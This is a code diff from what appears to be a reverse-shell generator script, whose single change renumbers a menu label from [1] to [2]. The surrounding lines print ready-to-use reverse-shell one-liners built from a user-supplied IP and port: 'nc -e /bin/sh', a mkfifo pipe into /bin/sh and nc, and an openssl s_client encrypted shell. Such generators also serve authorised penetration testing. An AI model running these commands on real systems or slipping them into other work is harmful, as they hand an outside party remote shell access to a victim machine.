@@ -20,7 +20,7 @@ def return_shells(shell, ip, port):
 		elif shell == "nc" or shell == "netcat":
 			print_shell("NetCat")
 			nc =bcolors.YELLOW + """[1]"""+bcolors.ENDC+""" nc -e /bin/sh """+ip+""" """+port
-			nc2 = bcolors.YELLOW + """[1]"""+bcolors.ENDC+""" rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc """+ip+""" """+port+""" >/tmp/f"""
+			nc2 = bcolors.YELLOW + """[2]"""+bcolors.ENDC+""" rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc """+ip+""" """+port+""" >/tmp/f"""
 			ncatssl = bcolors.YELLOW + """[3]"""+bcolors.ENDC+""" ncat --ssl -vv -l -p """+port+"""\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect \""""+ip+""":"""+port+"""\" > /tmp/s; rm /tmp/s"""
 			nc3 = bcolors.YELLOW + """[4]"""+bcolors.ENDC+"""touch /tmp/f; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc """+ip+""" """+port+""" > /tmp/f"""
 			print(nc);print(nc2);print(ncatssl)
